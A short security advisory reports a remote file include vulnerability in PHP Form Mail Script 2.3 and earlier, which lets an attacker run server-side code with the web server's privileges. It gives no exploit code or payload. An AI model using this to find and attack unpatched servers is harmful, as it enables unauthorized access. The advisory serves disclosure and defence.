PHP Form Mail Script is prone to remote file include vulnerability.

An attacker may leverage this issue to execute arbitrary server-side script code on an affected computer with the privileges of the Web server process. This may facilitate unauthorized access.

PHP Form Mail Script 2.3 and prior versions are vulnerable to this issue.
